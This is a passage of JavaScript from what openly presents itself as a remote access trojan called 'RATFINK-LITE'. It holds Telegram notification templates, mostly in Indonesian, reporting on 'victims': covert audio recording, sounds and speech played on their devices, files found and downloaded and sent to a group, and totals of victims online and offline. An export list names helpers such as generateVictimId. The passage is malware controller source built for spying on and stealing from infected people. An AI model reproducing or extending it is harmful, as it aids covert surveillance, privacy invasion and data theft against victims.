        victim_offline: `🔴 *VICTIM OFFLINE - RATFINK-LITE*\n━━━━━━━━━━━━━━\nID: \`${data.id}\`\nAlasan: ${data.reason}\nTerakhir Online: ${data.lastSeen}\nDurasi: ${data.duration}\n━━━━━━━━━━━━━━`,
        
        audio_played: `🎵 *AUDIO PLAYED - RATFINK-LITE*\n━━━━━━━━━━━━━━\nVictim: \`${data.victimId}\`\nSource: ${data.source}\nDuration: ${data.duration}s\nVolume: ${data.volume}\nLoop: ${data.loop}\n━━━━━━━━━━━━━━\n👤 Diputar oleh: ${data.executor}`,
        
        audio_recorded: `🎙️ *AUDIO RECORDED - RATFINK-LITE*\n━━━━━━━━━━━━━━\nVictim: \`${data.victimId}\`\nDurasi: ${data.duration}s\nKualitas: ${data.quality}\nUkuran: ${data.size}\n━━━━━━━━━━━━━━\n🎤 Hasil rekaman terkirim`,
        
        tts_spoken: `🗣️ *TTS SPOKEN - RATFINK-LITE*\n━━━━━━━━━━━━━━\nVictim: \`${data.victimId}\`\nText: "${data.text}"\nLanguage: ${data.lang}\nVolume: ${data.volume}\n━━━━━━━━━━━━━━\n👤 Diucapkan oleh: ${data.executor}`,
        
        file_found: `📁 *FILE FOUND - RATFINK-LITE*\n━━━━━━━━━━━━━━\nVictim: \`${data.victimId}\`\nPath: ${data.path}\nSize: ${data.size}\nType: ${data.type}\n━━━━━━━━━━━━━━`,
        
        file_downloaded: `⬇️ *FILE DOWNLOADED - RATFINK-LITE*\n━━━━━━━━━━━━━━\nVictim: \`${data.victimId}\`\nFilename: ${data.filename}\nSize: ${data.size}\n━━━━━━━━━━━━━━\n✅ File terkirim ke grup`,
        
        admin_stats: `📊 *ADMIN STATISTICS - RATFINK-LITE*\n━━━━━━━━━━━━━━\nTotal Victims: ${data.total}\nOnline: ${data.online}\nOffline: ${data.offline}\nCommands Today: ${data.cmdsToday}\nTotal Data: ${data.totalData}\nUptime: ${data.uptime}\n━━━━━━━━━━━━━━`,
        
        admin_help: `🔰 *RATFINK-LITE ADMIN HELP MENU*\n━━━━━━━━━━━━━━\n${data.categories}\n━━━━━━━━━━━━━━\nGunakan /admin_help [category]\nContoh: /admin_help victim`
    };
    
    return templates[type] || JSON.stringify(data, null, 2);
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        RATFINK_CONFIG,
        isAdmin,
        isModerator,
        isVIP,
        isBlacklisted,
        getUserRole,
        isUserAuthorized,
        getUserPermissions,
        isCommandAllowed,
        generateVictimId,
        formatTimestamp,
        formatBytes,
        formatDuration,
        formatTelegramMessage
    };
}